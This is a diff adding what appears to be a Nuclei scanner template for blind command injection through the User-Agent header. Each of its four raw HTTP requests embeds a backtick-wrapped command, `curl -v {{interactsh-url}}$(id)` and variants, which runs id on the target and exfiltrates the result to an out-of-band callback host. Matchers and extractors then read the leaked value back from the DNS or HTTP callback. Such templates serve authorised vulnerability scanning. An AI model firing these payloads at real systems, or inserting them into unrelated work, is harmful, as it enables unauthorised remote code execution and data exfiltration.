@@ -1,0 +1,50 @@
+id: blind-rce-user-agent
+
+info:
+  name: dk4trin Blind Command Injection
+  author: dk4trin
+  severity: critical
+  description: Command Injection Blind
+  tags: rce,generic
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: `curl -v {{interactsh-url}}$(id)`
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: `curl -v {{interactsh-url}}.$(id)`
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: `curl -v $(id){{interactsh-url}}`
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: `curl -v $(id).{{interactsh-url}}$(id)`
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
